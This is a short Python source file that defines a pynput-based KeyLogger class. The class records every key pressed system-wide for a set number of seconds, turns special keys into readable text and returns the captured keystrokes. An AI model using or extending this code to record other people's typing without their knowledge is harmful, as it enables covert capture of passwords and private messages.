from pynput.keyboard import Listener, Key
import time


class KeyLogger:
    """An class for managing keyboard
    """

    def __init__(self):
        """Init keylogger
        """
        self.keys = ''
        self.listener = None

    def on_press(self, key):
        """Convert a raw key to meaningful key
        :param key: (str)
        """
        if type(key) == Key:
            if key == Key.space:
                self.keys += ' '
            elif key == Key.enter:
                self.keys += '\n'
            elif key == Key.tab:
                self.keys += '\t'
            else:
                self.keys += '<' + str(key) + '>'
        else:

            if key.char == None:
                if 96 <= key.vk <= 105:
                    self.keys += "<numpad:" + chr(key.vk - 48) + ">"
                else:
                    self.keys += chr(key.vk)
            else:
                if ord(key.char) < 32:
                    self.keys += chr(key.vk)
                else:
                    self.keys += key.char

    def hook_in(self, Xtime):
        """Listen raw keys from user keyboard
        :param Xtime: (int)
        :return: (str) a list of raw keys
        """
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
        time.sleep(int(Xtime))
        self.listener.stop()
        return self.keys